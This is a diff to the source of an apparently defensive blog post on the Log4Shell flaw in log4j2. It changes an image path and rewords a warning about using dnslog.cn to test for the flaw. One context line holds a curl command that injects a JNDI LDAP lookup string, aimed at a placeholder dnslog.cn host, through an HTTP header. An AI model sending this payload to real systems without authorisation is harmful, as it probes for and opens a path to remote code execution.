@@ -2,7 +2,7 @@
 title: "Log4Shell: RCE 0-day exploit found in log4j2, a popular Java logging package"
 description: Given how ubiquitous this library is, the impact of this vulnerability is quite severe. Learn how to patch it, why it's bad, and more in this post.
 slug: log4j-zero-day
-image: https://www.lunasec.io/docs/img/log4shell-logo.png
+image: /img/log4shell-logo.png
 authors:
 - name: Free Wortley 
   title: CEO at LunaSec 
@@ -179,12 +179,12 @@ curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}'
 
 Refreshing the page will show DNS queries which identify hosts who have triggered the vulnerability.
 
-:::caution
+:::note
 
-Due to the widespread use of _dnslog.cn_ for testing log4shell, we advise caution when testing sensitive infrastructure as
-information being sent to this site could be used by the service's owners to exploit applications identified as vulnerable.
+While _dnslog.cn_ has become popular for testing log4shell, we advise caution. When testing sensitive infrastructure,
+information sent to this site could be used by its owner to catalogue and later exploit it.
 
-If this is something of concern to you and wish to test more discretely, you may [setup your own authoritative DNS server](https://www.joshmcguigan.com/blog/run-your-own-dns-servers/)
+If you wish to test more discretely, you may [setup your own authoritative DNS server](https://www.joshmcguigan.com/blog/run-your-own-dns-servers/)
 for testing.
 
 :::
